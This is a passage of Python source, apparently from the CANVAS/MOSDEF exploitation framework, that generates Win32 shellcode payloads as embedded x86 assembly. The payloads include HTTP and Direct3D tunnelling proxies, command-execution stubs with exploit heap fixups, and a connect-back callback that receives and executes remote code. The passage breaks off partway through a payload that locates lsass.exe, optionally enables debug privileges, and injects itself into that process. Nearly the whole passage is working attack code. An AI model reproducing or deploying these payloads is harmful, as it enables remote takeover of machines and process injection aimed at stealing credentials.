        call *GETEXITCODETHREAD-getpcloc(%ebp)
        popl %eax
        cmpl $259,%eax
        jne exit

        // init HCONNECT/HREQUEST handles
        pushl $0
        pushl $0
        pushl $3
        pushl $0
        pushl $0
        pushl HTTPPORT-getpcloc(%ebp)
        leal HTTPHOST-getpcloc(%ebp),%esi
        pushl %esi
        pushl HTTPHANDLE-getpcloc(%ebp)
        call *INTERNETCONNECTA-getpcloc(%ebp)
        movl %eax,HCONNECT-getpcloc(%ebp)
        pushl $0
        pushl $FLAGS
        pushl $0
        pushl $0
        pushl $0
        leal CLIENTID-getpcloc(%ebp),%esi
        pushl %esi
        leal POST-getpcloc(%ebp),%esi
        pushl %esi
        pushl HCONNECT-getpcloc(%ebp)
        call *HTTPOPENREQUESTA-getpcloc(%ebp)
        movl %eax,HREQUEST-getpcloc(%ebp)
        pushl $0x00003380
        movl %esp,%esi
        pushl $4
        pushl %esi
        pushl $31
        pushl HREQUEST-getpcloc(%ebp)
        call *INTERNETSETOPTIONA-getpcloc(%ebp)
        popl %eax // restore stack

        // build select array
        pushl FDSPOT_CNCT-getpcloc(%ebp)
        pushl $1
        movl %esp,%esi
        // build TIMEVAL
        pushl $TIMEOUT_USECS
        pushl $TIMEOUT_SECS
        movl %esp,%edi
        xorl %eax,%eax
        pushl %edi // timeout
        pushl %eax
        pushl %eax
        pushl %esi
        pushl %eax // ignored
        call *SELECT-getpcloc(%ebp)
        addl $16,%esp
        cmpl $1,%eax

        je mosdef_recv

        // think of this as a select on the HTTP end
        http_pop:

        pushl $0 // body size
        pushl $0 // body data
        pushl $-1 // header size (ascii mode will calc to zero terminator on -1)
        leal MODE_POP-getpcloc(%ebp),%esi
        pushl %esi // header data
        pushl HREQUEST-getpcloc(%ebp)
        call *HTTPSENDREQUESTA-getpcloc(%ebp)

        test %eax,%eax
        jz exit

        // now get the Content_Length dword and internetreadfile everything
        xorl %eax,%eax
        pushl $4
        movl %esp,%ebx
        pushl %eax
        movl %esp,%ecx
        pushl %eax
        pushl %ebx
        pushl %ecx
        pushl $0x20000005 // HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_CONTENT_LENGTH
        pushl HREQUEST-getpcloc(%ebp)
        call *HTTPQUERYINFOA-getpcloc(%ebp)
        popl %eax // content length
        popl %ebx

        pushl %eax
        pushl %eax
        xorl %ebx,%ebx // offset

        readfile:

        pushl %eax
        movl %esp,%edi
        pushl %edi
        pushl %eax
        movl MOSDEF_PAGE-getpcloc(%ebp),%edi
        addl %ebx,%edi
        pushl %edi
        pushl HREQUEST-getpcloc(%ebp)
        call *INTERNETREADFILE-getpcloc(%ebp)
        test %eax,%eax

        jnz readfile_done

        popl %ebx
        popl %eax
        subl %ebx,%eax // adjust count with received bytes
        popl %ebx
        pushl %ebx
        subl %eax,%ebx // inverse offset from total len
        pushl %eax

        jmp readfile

        readfile_done:

        // have to close HREQUEST _before_ HCONNECT
        pushl HREQUEST-getpcloc(%ebp)
        call *INTERNETCLOSEHANDLE-getpcloc(%ebp)
        pushl HCONNECT-getpcloc(%ebp)
        call *INTERNETCLOSEHANDLE-getpcloc(%ebp)

        popl %ebx
        popl %ebx
        popl %ecx // original content length

        // pipe the data along to the tcp end
        mosdef_send:

        xorl %eax,%eax
        pushl %eax
        pushl %ecx
        pushl MOSDEF_PAGE-getpcloc(%ebp)
        pushl FDSPOT_CNCT-getpcloc(%ebp)
        call *SEND-getpcloc(%ebp)
        cmpl $-1,%eax
        je exit

        jmp select_mosdef_and_http

        mosdef_recv:

        xorl %eax,%eax
        pushl %eax
        pushl $0x10000
        pushl MOSDEF_PAGE-getpcloc(%ebp)
        pushl FDSPOT_CNCT-getpcloc(%ebp)
        call *RECV-getpcloc(%ebp)
        cmpl $-1,%eax
        je exit
        pushl %eax

        // push the data out over HTTP (len in eax)
        http_push:

        popl %ecx // get received length
        pushl %ecx // body size
        pushl MOSDEF_PAGE-getpcloc(%ebp) // body data
        pushl $-1
        leal MODE_PUSH_LAST-getpcloc(%ebp),%esi
        pushl %esi // header data
        pushl HREQUEST-getpcloc(%ebp)
        call *HTTPSENDREQUESTA-getpcloc(%ebp)

        test %eax,%eax
        jz exit

        // have to close HREQUEST _before_ HCONNECT
        pushl HREQUEST-getpcloc(%ebp)
        call *INTERNETCLOSEHANDLE-getpcloc(%ebp)
        pushl HCONNECT-getpcloc(%ebp)
        call *INTERNETCLOSEHANDLE-getpcloc(%ebp)

        jmp select_mosdef_and_http

        // not reached from parent
        bind_mosdef:

        movl 4(%esp),%ebp // thread arg
        pushl $0x6
        pushl $0x1
        pushl $0x2
        cld
        call *SOCKET-getpcloc(%ebp)
        movl %eax,FDSPOT_BIND-getpcloc(%ebp)
        pushl $0x0
        pushl $0x0
        pushl $REPLACEHOST // 127.0.0.1
        pushl $REPLACEPORT // 5555 / 0x15b3
        movl %esp,%ecx
        pushl $0x10
        pushl %ecx
        pushl %eax
        call *BIND-getpcloc(%ebp)
        incl %eax
        pushl %eax
        pushl FDSPOT_BIND-getpcloc(%ebp)
        call *LISTEN-getpcloc(%ebp)

        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl %ebp
        leal connect_mosdef-getpcloc(%ebp),%esi
        pushl %esi
        pushl %eax
        pushl %eax
        call *CREATETHREAD-getpcloc(%ebp)

        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl FDSPOT_BIND-getpcloc(%ebp)
        call *ACCEPT-getpcloc(%ebp)
        movl %eax,FDSPOT_BIND-getpcloc(%ebp)

        recvexecloop:

        movl FDSPOT_BIND-getpcloc(%ebp), %edx

        gogetlen:

        pushl %edx
        xorl %eax,%eax
        pushl %eax
        movl %esp,%esi
        pushl %eax
        movb $4,%al
        pushl %eax
        pushl %esi
        pushl %edx
        call *RECV-getpcloc(%ebp)
        cmpb $4, %al
        je gogotlen
        popl %edx
        popl %edx

        jmp exit_mosdef

        gogotlen:

        popl %edi
        pushl $0x40
        pushl $0x1000
        pushl %edi
        pushl $0
        call *VIRTUALALLOC-getpcloc(%ebp)
        popl %edx
        andl $0xFFFFFF00,%esp
        movl %eax,%esi
        movl %eax,%ecx

        gorecvexecloop:

        pushl %edx
        pushl %ecx
        xorl %eax,%eax
        pushl %eax
        pushl %edi
        pushl %ecx
        pushl %edx
        call *RECV-getpcloc(%ebp)
        popl %ecx
        popl %edx
        cmpl $-1,%eax

        je exit_mosdef

        cmpl %eax,%edi

        je stagetwo

        subl %eax,%edi
        addl %eax,%ecx

        jmp gorecvexecloop

        stagetwo:

        push %ebx
        xchg %edx, %esi
        call *%edx
        xchg %edx, %esi
        popl %ebx
        pushl $0x8000 // release
        pushl $0x0
        pushl %esi
        call *VIRTUALFREE-getpcloc(%ebp)

        jmp recvexecloop

        exit:

        // close the socket so the mosdef thread suicides as well
        movl FDSPOT_BIND-getpcloc(%ebp),%esi
        pushl %esi
        call *CLOSESOCKET-getpcloc(%ebp)

        pushl $0x8000 // release
        pushl $0
        pushl MOSDEF_PAGE-getpcloc(%ebp)
        call *VIRTUALFREE-getpcloc(%ebp)

        pushl HTTPHANDLE-getpcloc(%ebp)
        call *INTERNETCLOSEHANDLE-getpcloc(%ebp)

        exit_mosdef:

        xorl %eax,%eax
        pushl %eax
        pushl $0xfffffffe
        call *TERMINATETHREAD-getpcloc(%ebp)
        """

        codegen.main = codegen.main.replace('REPLACEHOST', \
                           uint32fmt(istr2int(socket.inet_aton('127.0.0.1'))))
        codegen.main = codegen.main.replace('REPLACEPORT', \
                           uint32fmt(reverseword((0x02000000 | random.randint(5555,10000) ))))

        codegen.main = codegen.main.replace('TIMEOUT_USECS', '500000')
        codegen.main = codegen.main.replace('TIMEOUT_SECS', '0')

        if SSL:
            logging.warning("HTTP PROXY Payload enabled SSL")
            codegen.main = codegen.main.replace('FLAGS', '0x84C03100')
        else:
            codegen.main = codegen.main.replace('FLAGS', '0x80400100')

        # this needs to:
        # - bind a localhost mosdef
        # - connect to it
        # - have a HTTP/socket select loop
        # NOTE: protocol is specified in http_proxy.py

        return codegen.get()

    def framebuffer_proxy(self, load_winsock=True):
        """ a direct3d to tcp MOSDEF proxy payload """
        codegen = self.get_basecode()

        # ws2_32.dll
        codegen.find_function('kernel32.dll!loadlibrarya')
        if load_winsock == True:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('ws2_32.dll!wsastartup')

        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!bind')
        codegen.find_function('ws2_32.dll!listen')
        codegen.find_function('ws2_32.dll!accept')
        codegen.find_function('ws2_32.dll!send')
        codegen.find_function('ws2_32.dll!recv')
        codegen.find_function('ws2_32.dll!select')
        codegen.find_function('ws2_32.dll!closesocket')

        # kernel32.dll
        codegen.find_function('kernel32.dll!createthread')
        codegen.find_function('kernel32.dll!exitthread')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!virtualfree')
        codegen.find_function('kernel32.dll!virtualquery')
        codegen.find_function('kernel32.dll!createeventa')
        codegen.find_function('kernel32.dll!waitforsingleobject')

        if load_winsock == True:
            # wsastartup
            codegen.main += """
            subl $0x200,%esp
            pushl %esp
            xorl %ebx,%ebx
            movb $0x2,%bh
            movb $0x2,%bl
            pushl %ebx
            call *WSASTARTUP-getpcloc(%ebp)
            addl $0x200,%esp
            """
        codegen._globals.addDword('FDSPOT_BIND')
        codegen._globals.addDword('FDSPOT_CNCT')
        codegen._globals.addDword('HEVENT')
        codegen._globals.addDword('FBADDRESS')
        codegen._globals.addDword('FBSIZE')
        codegen._globals.addDword('D3DMOSDEF_BUF')

        codegen.main += """
        movl 0x8(%esp),%esi
        subl $0x1c,%esp
        movl %esp,%eax
        pushl $0x1c
        pushl %eax
        pushl %esi
        call *VIRTUALQUERY-getpcloc(%ebp)
        movl 0x4(%esp),%eax
        movl %eax,FBADDRESS-getpcloc(%ebp)
        movl 0xc(%esp),%eax
        subl $0x10,%eax
        movl %eax,FBSIZE-getpcloc(%ebp)
        addl $0x1c,%esp

        // thread off the mosdef bind
        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl %ebp
        leal bind_mosdef-getpcloc(%ebp),%esi

        pushl %esi
        pushl %eax
        pushl %eax
        call *CREATETHREAD-getpcloc(%ebp)

        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax
        call *CREATEEVENTA-getpcloc(%ebp)
        movl %eax,HEVENT-getpcloc(%ebp)

locate_mosdefoverdirect3d:

        pushl $0x1f4
        pushl HEVENT-getpcloc(%ebp)
        call *WAITFORSINGLEOBJECT-getpcloc(%ebp)

        jmp gethandler
gothandler:
        xorl %eax,%eax
        pushl $-0x1
        movl %esp,%fs:(%eax)

        // READ FROM THE FB HERE
        movl FBADDRESS-getpcloc(%ebp),%edi
        movl FBSIZE-getpcloc(%ebp),%ecx
        shrl $0x4,%ecx
        movl $0x44534f4d,%eax
        repne scasl
        test %ecx,%ecx
        je locate_mosdefoverdirect3d
        cmpl $0x764f4645,0x0(%edi)
        jne locate_mosdefoverdirect3d
        addl $0x14,%edi
        movl %edi,D3DMOSDEF_BUF-getpcloc(%ebp)

        // connect to bound localhost mosdef
connect_mosdef:

        pushl $0x6
        pushl $0x1
        pushl $0x2
        cld
        call *SOCKET-getpcloc(%ebp)
        movl %eax,FDSPOT_CNCT-getpcloc(%ebp)
        xorl %ebx,%ebx
        pushl %ebx
        pushl %ebx
        pushl $REPLACEHOST // host
        pushl $REPLACEPORT // port
        movl %esp,%ecx
        pushl $0x10
        pushl %ecx
        pushl %eax
        call *CONNECT-getpcloc(%ebp)
        cmpl $-1,%eax
        je exit_mosdef

        // this loops until exit
select_mosdef_and_framebuffer:

        // build select array
        pushl FDSPOT_CNCT-getpcloc(%ebp)
        pushl $1
        movl %esp,%esi
        // build TIMEVAL
        pushl $TIMEOUT_USECS
        pushl $TIMEOUT_SECS
        movl %esp,%edi
        xorl %eax,%eax
        pushl %edi // timeout
        pushl %eax
        pushl %eax
        pushl %esi
        pushl %eax // ignored
        call *SELECT-getpcloc(%ebp)
        addl $16,%esp
        cmpl $1,%eax
        je mosdef_recv

mosdef_send:

        movl D3DMOSDEF_BUF-getpcloc(%ebp),%esi
        movl %esi,%edi
        lodsl
        cmpl $0x01,%eax // GUEST_DATA
        jne select_mosdef_and_framebuffer

        xorl %eax,%eax
        stosl
        lodsl
        stosl

        xorl %ecx,%ecx
        pushl %ecx
        pushl %eax
        pushl %edi
        pushl FDSPOT_CNCT-getpcloc(%ebp)
        call *SEND-getpcloc(%ebp)
        cmpl $-1,%eax
        je exit

        jmp select_mosdef_and_framebuffer

mosdef_recv:

        movl D3DMOSDEF_BUF-getpcloc(%ebp),%esi
        movl %esi,%edi
        lodsl
        test %eax,%eax
        je do_recv

        pushl $0xc8
        pushl HEVENT-getpcloc(%ebp)
        call *WAITFORSINGLEOBJECT-getpcloc(%ebp)
        jmp mosdef_recv

do_recv:

        lodsl
        xorl %eax,%eax
        pushl %eax
        pushl $0x10000
        pushl %esi
        pushl FDSPOT_CNCT-getpcloc(%ebp)
        call *RECV-getpcloc(%ebp)
        cmpl $-1,%eax
        je exit

        movl %eax,0x4(%edi)
        movl $0x2,%eax // HOST_DATA
        stosl

        jmp select_mosdef_and_framebuffer

gethandler:
        call gothandler
handler:
        xorl %eax,%eax
        pushl %eax
        call *EXITTHREAD-getpcloc(%ebp)

        // not reached from parent
bind_mosdef:

        movl 4(%esp),%ebp // thread arg
        pushl $0x6
        pushl $0x1
        pushl $0x2
        cld
        call *SOCKET-getpcloc(%ebp)
        movl %eax,FDSPOT_BIND-getpcloc(%ebp)
        pushl $0x0
        pushl $0x0
        pushl $REPLACEHOST // 127.0.0.1
        pushl $REPLACEPORT // 5555 / 0x15b3
        movl %esp,%ecx
        pushl $0x10
        pushl %ecx
        pushl %eax
        call *BIND-getpcloc(%ebp)
        incl %eax
        pushl %eax
        pushl FDSPOT_BIND-getpcloc(%ebp)
        call *LISTEN-getpcloc(%ebp)
        pushl %eax
        pushl %eax
        pushl FDSPOT_BIND-getpcloc(%ebp)
        call *ACCEPT-getpcloc(%ebp)
        movl %eax,FDSPOT_BIND-getpcloc(%ebp)

recvexecloop:

        movl FDSPOT_BIND-getpcloc(%ebp), %edx

gogetlen:

        pushl %edx
        xorl %eax,%eax
        pushl %eax
        movl %esp,%esi
        pushl %eax
        movb $4,%al
        pushl %eax
        pushl %esi
        pushl %edx
        call *RECV-getpcloc(%ebp)
        cmpb $4, %al
        je gogotlen
        popl %edx
        popl %edx

        jmp exit_mosdef

gogotlen:

        popl %edi
        pushl $0x40
        pushl $0x1000
        pushl %edi
        pushl $0
        call *VIRTUALALLOC-getpcloc(%ebp)
        popl %edx
        andl $0xFFFFFF00,%esp
        movl %eax,%esi
        movl %eax,%ecx

gorecvexecloop:

        pushl %edx
        pushl %ecx
        xorl %eax,%eax
        pushl %eax
        pushl %edi
        pushl %ecx
        pushl %edx
        call *RECV-getpcloc(%ebp)
        popl %ecx
        popl %edx
        cmpl $-1,%eax

        je exit_mosdef

        cmpl %eax,%edi

        je stagetwo

        subl %eax,%edi
        addl %eax,%ecx

        jmp gorecvexecloop

stagetwo:

        push %ebx
        xchg %edx, %esi
        call *%edx
        xchg %edx, %esi
        popl %ebx
        pushl $0x8000 // release
        pushl $0x0
        pushl %esi
        call *VIRTUALFREE-getpcloc(%ebp)

        jmp recvexecloop

exit:

        // close the socket so the mosdef thread suicides as well
        movl FDSPOT_BIND-getpcloc(%ebp),%esi
        pushl %esi
        call *CLOSESOCKET-getpcloc(%ebp)

exit_mosdef:

        xorl %eax,%eax
        pushl %eax
        call *EXITTHREAD-getpcloc(%ebp)
        """

        codegen.main = codegen.main.replace('REPLACEHOST', \
                           uint32fmt(istr2int(socket.inet_aton('127.0.0.1'))))
        codegen.main = codegen.main.replace('REPLACEPORT', \
                           uint32fmt(reverseword((0x02000000 | random.randint(5000, 10000)))))

        codegen.main = codegen.main.replace('TIMEOUT_USECS', '100000')
        codegen.main = codegen.main.replace('TIMEOUT_SECS', '0')

        return codegen.get()

    def win32_exec(self, command):
        # a payload to just execute single commands
        codegen = self.get_basecode()

        codegen.find_function('kernel32.dll!createprocessa')
        codegen.find_function('kernel32.dll!exitthread')

        codegen._globals.addString('COMMAND', command)

        codegen.main += """
            xorl %ecx,%ecx
            xorl %eax,%eax
            movb $25,%cl        // want 100 bytes zeroed stack space
        pushnull:
            pushl %eax
            loop pushnull       // get some zeroed stackvar mem
            movl %esp,%ebx
            movl $68,(%ebx)     // si.cb
            movl $1,44(%ebx)    // si.dwFlags STARTF_USESHOWWINDOW
            leal 68(%ebx),%eax  // pi
            pushl %eax
            pushl %ebx
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            leal COMMAND-getpcloc(%ebp),%esi
            pushl %esi          // command
            pushl $0
            call *CREATEPROCESSA-getpcloc(%ebp)
            pushl %eax
            call *EXITTHREAD-getpcloc(%ebp)
        """
        return codegen.get()

    def kostya_exec(self, command):
        # a payload to just execute single commands
        codegen = self.get_basecode()

        codegen.find_function('kernel32.dll!createprocessa')
        codegen.find_function('kernel32.dll!exitthread')

        codegen._globals.addString('COMMAND', command)

        codegen.main += """
            // fix heap special case
            movl $0x70178, *(0x70178) // clearing FreeList[0]
            movl $0x70178, *(0x7017c) // clearing FreeList[0]
            xorl %eax, %eax
            movl %eax, *(0x70580)     // clear Lookaside
            movl %eax, *(0x70058)     // clearing the Segments (loop 64 times)
            andl $0xfffffffc, %esp

nop
nop
nop
            // special fixup for project -bas
            pushl $0x41424344
            popl %eax
            movl %eax,%ebx
nop
nop
nop
            addl $0x5f0,%ebx
            movl %ebx,(%eax)

            // command exec
            xorl %ecx,%ecx
            xorl %eax,%eax
            movb $25,%cl        // want 100 bytes zeroed stack space
        pushnull:
            pushl %eax
            loop pushnull       // get some zeroed stackvar mem
            movl %esp,%ebx
            movl $68,(%ebx)     // si.cb
            movl $1,44(%ebx)    // si.dwFlags STARTF_USESHOWWINDOW
            movl $1,48(%ebx)    // si.wShowWindow SW_SHOWNORMAL (is a word! but whatever lol)
            leal 68(%ebx),%eax  // pi
            pushl %eax
            pushl %ebx
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            leal COMMAND-getpcloc(%ebp),%esi
            pushl %esi          // command
            pushl $0
            call *CREATEPROCESSA-getpcloc(%ebp)

            xorl %eax,%eax
            add $0x7c,%esp
            pop %ebp
            ret
        """
        return codegen.get()

    # little demo to show the flexibility of the simplified generator
    def callback(self, host, port, load_winsock=True, universal=False, close_socket=None):
        """ generate a standalone callback payload .. example! """

        codegen = self.get_basecode()
        codegen.find_function('kernel32.dll!loadlibrarya')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!virtualfree')
        codegen.find_function('kernel32.dll!getcurrentthread')
        codegen.find_function('kernel32.dll!terminatethread')
        codegen.find_function('kernel32.dll!exitthread')

        if load_winsock:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('ws2_32.dll!wsastartup')

        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!closesocket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!recv')
        codegen.find_function('ws2_32.dll!wsagetlasterror')

        if universal:
            codegen.find_function('ws2_32.dll!send')

        # enable the debug stub
        codegen.enable_debug()

        if load_winsock:
            # wsastartup
            codegen.main += """
                subl $0x200, %esp
                pushl %esp
                xorl %ebx, %ebx
                movb $0x1, %bh
                movb $0x1, %bl
                pushl %ebx
                call *WSASTARTUP-getpcloc(%ebp)
                addl $0x200, %esp // mosdef still has that issue with 0x100/256 sized addl's!
            """
        # now we write a little main using the functions
        # all needed inits etc. have already been added to main
        # functions found will be @ FUNCTIONLOC you call like so:
        # push args right to left
        # call *FUNCTIONLOC-getpcloc(%ebp)

        codegen._globals.addDword('FDSPOT')

        codegen.main += """
            pushl $0x6
            pushl $0x1
            pushl $0x2
            cld
            call *SOCKET-getpcloc(%ebp)
            movl %eax, FDSPOT-getpcloc(%ebp)
            xorl %ebx, %ebx
            pushl %ebx
            pushl %ebx
            pushl $REPLACEHOST // host
            pushl $REPLACEPORT // port
            movl %esp, %ecx
            pushl $0x10
            pushl %ecx
            pushl %eax // holds sock
            call *CONNECT-getpcloc(%ebp)
            test  %eax, %eax
            jl    exit
        """

        if universal:
            if (self.module
                and hasattr(self.module, 'engine') == True
                and self.module.engine):

                mosdef_type = self.module.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
                mosdef_id = self.module.engine.getNewMosdefID(self.module)

            else:
                mosdef_type = 0
                mosdef_id = 0

            # print "point check #1"
            logging.info('Using Win32 Universal, type: %d, id: %d' % (mosdef_type, mosdef_id))

            codegen.main += """
send_universal:
                pushl $MOSDEF_TYPE
                movl %esp, %esi
                movl $4, %edi
sendloop_one:
                pushl $0
                pushl %edi
                pushl %esi
                pushl FDSPOT-getpcloc(%ebp)
                call *SEND-getpcloc(%ebp)
                test  %eax, %eax
                jl    exit
                sub %eax, %edi
                add %eax, %esi
                test %edi, %edi
                jne sendloop_one
                popl %eax

                pushl $MOSDEF_ID
                movl %esp, %esi
                movl $4, %edi
sendloop_two:
                pushl $0
                pushl %edi
                pushl %esi
                pushl FDSPOT-getpcloc(%ebp)
                call *SEND-getpcloc(%ebp)
                test  %eax, %eax
                jl    exit
                sub %eax, %edi
                add %eax, %esi
                test %edi, %edi
                jne sendloop_two
                popl %eax
            """

            codegen.main = codegen.main.replace('MOSDEF_TYPE', str(reverseword(mosdef_type)))
            codegen.main = codegen.main.replace('MOSDEF_ID', str(reverseword(mosdef_id)))

        codegen.main += """
recvexecloop:
            // this uses edx internally as the socket reg
            movl FDSPOT-getpcloc(%ebp), %edx
gogetlen:
            pushl %edx
            // get len room
            xorl %eax, %eax
            pushl %eax
            movl %esp, %esi
            // flags
            pushl %eax
            // len 4
            movb $4, %al
            pushl %eax
            // recv buf
            pushl %esi
            // SOCKET
            pushl %edx
            // call recv
            call *RECV-getpcloc(%ebp)
            // if anything but 4 we failed
            cmpb $4, %al
            je gogotlen
            // eat room push
            popl %edx
            // restore socket
            popl %edx
            // we failed, try again or do something else?
            jmp exit
gogotlen:
            // get len into edi
            popl %edi
            // ALLOC HERE
            pushl $0x40
            pushl $0x1000
            pushl %edi
            pushl $0
            call *VIRTUALALLOC-getpcloc(%ebp)
            // eax has where we want to jump
            // restore SOCKET
            popl %edx
            // normalise stack pointer
            andl $0xFFFFFF00, %esp
            // save ptr for us to jmp to later on
            movl %eax, %esi
            // save ptr we can adjust freely
            movl %eax, %ecx
gorecvexecloop:
            // save SOCKET
            pushl %edx
            // save our offset stackptr
            pushl %ecx
            // flags
            xorl %eax, %eax
            pushl %eax
            // len
            pushl %edi
            // buf
            pushl %ecx
            // SOCKET
            pushl %edx
            call *RECV-getpcloc(%ebp)
            // get our offset ptr back
            popl %ecx
            // get our socket back
            popl %edx
            // if we're -1 exit or do something else?
            cmpl $-1, %eax
            je exit
            // see if we're done yet
            cmpl %eax, %edi
            je stagetwo
            // didnt get all the data yet
            subl %eax, %edi
            addl %eax, %ecx
            jmp gorecvexecloop
stagetwo:
            // reset ebx so we dont get confused
            push %ebx
            // edx has socket handle, esi has address to call...we exchange them
            xchg %edx, %esi
            call *%edx
            //now change them back so we can free esi later
            xchg %edx, %esi
            popl %ebx

            // free the memory !
            pushl $0x8000 // release
            pushl $0x0
            pushl %esi
            call *VIRTUALFREE-getpcloc(%ebp)
            jmp recvexecloop
exit:
            SOCKET_CLOSE_STUB
            xorl %eax, %eax
            pushl %eax
            call *EXITTHREAD-getpcloc(%ebp)
            """

        close_stub = ""
        if (close_socket == None and CanvasConfig["ensure_disconnect_shellcode"]) or close_socket:
            close_stub = """movl FDSPOT-getpcloc(%ebp), %edx
                            pushl %edx
                            call *CLOSESOCKET-getpcloc(%ebp)"""

        codegen.main = codegen.main.replace("SOCKET_CLOSE_STUB", close_stub)


        codegen.main = codegen.main.replace('REPLACEHOST', \
                           uint32fmt(istr2int(socket.inet_aton(host))))

        codegen.main = codegen.main.replace('REPLACEPORT', \
                           uint32fmt(reverseword((0x02000000 | port))))

        # now all that's left is to do a receive from fd spot :)
        # will fill that in later .. just testing if mechanism works ..
        return codegen.get()

    def injectintoprocess(self, host, port, pid=1234, target='lsass.exe', load_winsock = False, SeDebugPrivilege=False, waitcode = False, exit_thread=True, universal=False, dll_create_thread=True):
        """ migrating callback payload .. size .. so minimal """
        codegen = self.get_basecode(restorehash = True, dll_create_thread=dll_create_thread)
        # codegen = self.get_basecode(restorehash = False)

        codegen.find_function('kernel32.dll!openprocess')
        codegen.find_function('kernel32.dll!virtualallocex')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!writeprocessmemory')
        codegen.find_function('kernel32.dll!createremotethread')
        codegen.find_function('kernel32.dll!exitthread')
        if waitcode:
            codegen.find_function("kernel32.dll!closehandle")
            codegen.find_function("kernel32.dll!waitforsingleobject")

        if load_winsock:
            codegen.find_function('kernel32.dll!loadlibrarya')
            codegen.load_library('ws2_32.dll')

        codegen.find_function('ntdll.dll!ntquerysysteminformation')
        if load_winsock == True:
            codegen.find_function('ws2_32.dll!wsastartup')
        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!recv')

        if universal:
            codegen.find_function('ws2_32.dll!send')

        if SeDebugPrivilege:
            codegen.find_function("kernel32!getcurrentprocess")
            codegen.find_function("kernel32!closehandle")
            codegen.find_function("advapi32!lookupprivilegevaluea")
            codegen.find_function("advapi32!openprocesstoken")
            codegen.find_function("advapi32!adjusttokenprivileges")


        if load_winsock == True:
            # wsastartup
            codegen.main += """
                subl $0x200,%esp
                pushl %esp
                xorl %ebx,%ebx
                movb $0x1,%bh
                movb $0x1,%bl
                pushl %ebx
                call *WSASTARTUP-getpcloc(%ebp)
                addl $0x200,%esp
            """

        codegen._globals.addDword('RADDRESS')
        # Added to support universal MOSDEF
        codegen._globals.addDword("FDSPOT")
        codegen._globals.addUnicodeString('PROCESSNAME', target)
        if SeDebugPrivilege:
            codegen._globals.addDword('SE_DEBUG_NAME')

        codegen.main += """
injectprocess:
            xorl %eax, %eax
            incl %eax
            jz callback_mode

            leal injectprocess-getpcloc(%ebp),%ecx
            movb $0x90, 2(%ecx)
            """

        getTokenPrivs = """
        // get debug privileges SE_DEBUG_NAME == SeDebugPrivilege
        // SE_PRIVILEGE_ENABLED == 2
        // TOKEN_ADJUST_PRIVILEGES == 32
        // our TOKEN_PRIVILEGES STRUCT == { 1, { 0, 0, SE_PRIVILEGE_ENABLED }

        // build TOKEN_PRIVILEGES struct

        xor %edi, %edi
        xor %eax, %eax
        inc %eax
        pushl $2
        push  %edi
        pushl %edi
        pushl %eax
        movl %esp,%esi

        // lookupprivilegevaluea()

        pushl %esi
        addl $4,(%esp)
        leal SE_DEBUG_NAME-getpcloc(%ebp),%eax
        pushl %eax
        pushl %edi // 0x0
        call LOOKUPPRIVILEGEVALUEA-getpcloc(%ebp)

        // getcurrentprocess()

        call GETCURRENTPROCESS-getpcloc(%ebp)
        // openprocesstoken()

        pushl %edi
        // ptr to hToken
        pushl %esp
        pushl $32
        pushl %eax
        call OPENPROCESSTOKEN-getpcloc(%ebp)

        // get hToken
        movl (%esp),%esi

        // adjusttokenprivileges()

        pushl %edi //returnlength
        pushl %edi //bufferlength
        pushl $16 //pointer to NewState ??!!
        pushl %edi //disable all privs
        pushl %esi //token handle

        call *ADJUSTTOKENPRIVILEGES-getpcloc(%ebp)

        // closehandle()
        pushl %esi
        call CLOSEHANDLE-getpcloc(%ebp)
        """
        if SeDebugPrivilege:
            codegen.main += getTokenPrivs

        codegen.main += """
            pushl $0x40
            pushl $0x1000
            pushl $0x1e004
            pushl $0
            call *VIRTUALALLOC-getpcloc(%ebp)
            movl %eax,%edi
            pushl %edi
            pushl $0x1e000
            addl $4,%edi
            pushl %edi
            pushl $5
            call *NTQUERYSYSTEMINFORMATION-getpcloc(%ebp)

            // #save information for backup
            // #pushl %edi

            // ptr = buffer + p->NextEntryDelta
next_delta:
            // don't ask ;P
            nop
            // check if no next delta, if none, jmp to backup
            movl (%edi),%eax

            addl (%edi),%edi
            // offset to ptr to UNICODE_STRING ProcessName is 0x38 + 4
            movl 0x3c(%edi),%esi
            movl $PROCESSLEN,%ecx
            // cmp if len matches first, if not next delta
            //xorl %edx,%edx
            //movw 0x38(%edi),%dx
            //$cmpl %ecx,%edx
            //$jne next_delta
            // comparing strings
            leal PROCESSNAME-getpcloc(%ebp),%edx
            next_byte:
            movb (%esi),%al
            cmpb %al,(%edx)
            jne next_delta
            incl %esi
            incl %edx
            decl %ecx
            jnz next_byte
            // found LSASS.EXE !
            movl 0x44(%edi), %eax // saving pid
openpid:
            // openprocess
            //xorl %eax,%eax
            //movw $PID,%ax
            pushl %eax
            xorl %eax,%eax
            pushl %eax
            movw $0x43a,%ax  // 0x43a
            pushl %eax
            call *OPENPROCESS-getpcloc(%ebp)
            movl %eax, %edi // Process handle

            // virtual alloc in remote process
            xorl %eax,%eax
            movb $0x40,%al
            pushl %eax
            movw $0x1000,%ax
            pushl %eax                   // AllocType
            // codesize
            pushl $0xdeadbabe            // dwSize
            xorl %eax,%eax
            pushl %eax                   // lpAddress
            pushl %edi                   // hProcess
            call *VIRTUALALLOCEX-getpcloc(%ebp)
            movl %eax, %esi // Remote Addr

            // write process memory our entire payload
            xorl %eax,%eax
            pushl %eax
            // codesize
            pushl $0xdeadbeef
            movl %ebp,%eax
            subl $12, %ax
            pushl %eax
            // dest is in RADDR
            pushl %esi
